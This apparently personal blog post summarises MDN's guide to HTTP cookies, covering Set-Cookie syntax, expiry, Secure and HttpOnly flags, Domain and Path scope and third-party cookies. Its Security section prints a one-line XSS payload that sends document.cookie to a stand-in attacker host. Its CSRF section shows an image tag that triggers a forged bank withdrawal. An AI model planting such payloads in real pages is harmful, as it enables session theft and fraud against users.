---
layout : post
title : Http Cookie
comments: true
categories : Other
---

  An HTTP cookie is a small piece of data that a server sends to the user's web browser. 
  
  The browser stores it(if it is enabled) and send it back to the same server in subsequent each request
  inside a Cookie HTTP header.  

### Purpose

  1. Session management
  2. Personalization
  3. Tracking
  
### Storage

  It is recommended nowadays to prefer modern storage APIs to improve performance. 
  
  Modern APIs for client storage are the [Web storage API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API) (`localStorage` and `sessionStorage`) 
  and [IndexedDB](https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API).
  
### Creating cookies

  When receiving an HTTP request, a server can send a `Set-Cookie` header with the response. A simple cookie is set like this:
  
  > Set-Cookie: \<cookie-name\>=\<cookie-value\>
  
  This header from the server tells the client to store a cookie.
  
  After that, the browser will send back all previously stored cookies to the server using the `Cookie` header.
  
### Session cookies

  Session cookie will be deleted when the browser shuts down, because it didn't specify an `Expires` or `Max-Age` directive.
  
### Permanent cookies

  Permanent cookies expire at a specific date (`Expires`) or after a specific length of time (`Max-Age`).
  
  > Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
  
  Note: When an expiry date is set, the time and date set is relative to the client the cookie is being set on, not the server.
  
### Secure and HttpOnly cookies

  A `secure` cookie is only sent to the server over the `HTTPS` protocol. 
  
  **Note: This flag doesn't make sure the cookies will be sent secure.** 
  
  To prevent cross-site scripting (XSS) attacks, `HttpOnly` cookies are inaccessible to JavaScript's `Document.cookie` API,
  that is if the `HttpOnly` flag is not set, existing cookies can be accessed from JavaScript like `console.log(document.cookie);`.
  
  > Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
  
### Scope of cookies

  The `Domain` and `Path` directives define the scope of the cookie: what URLs the cookies should be sent to.

  `Domain` specifies allowed hosts to receive the cookie. 
  If unspecified, it defaults to the host of the current document location, **excluding subdomains**. 
  If it is specified, then subdomains are always included.

  For example, if `Domain=mozilla.org` is set, then cookies are included on subdomains like `developer.mozilla.org`.

  `Path` indicates a URL path that must exist in the requested URL in order to send the Cookie header. 
  
  For example, if `Path=/docs` is set, these paths will match:

  - `/docs`
  - `/docs/Web/`
  - `/docs/Web/HTTP`
  
### Security

  Common ways to steal cookies include Social Engineering or exploiting an XSS vulnerability in the application.
  
  > (new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
  
### Cross-site request forgery (CSRF)

  Someone includes an image that isn’t really an image (for example in an unfiltered chat or forum), 
  instead it really is a request to your bank’s server to withdraw money:
  
  > \<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
  
### Third-party cookies

  Cookies have a domain associated to them. If this domain is the same as the domain of the page you are on, 
  the cookies is said to be a **first-party cookie**. If the domain is different, it is said to be a **third-party cookie**. 
  
  While `first-party` cookies are sent only to the server setting them, 
  a web page may contain images or other components stored on servers in other domains (like ad banners).
  
### Do-Not-Track

  The `DNT` header can be used to signal that a web application should disable either its tracking or 
  cross-site user tracking of an individual user. 
  
### References

[mozilla](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
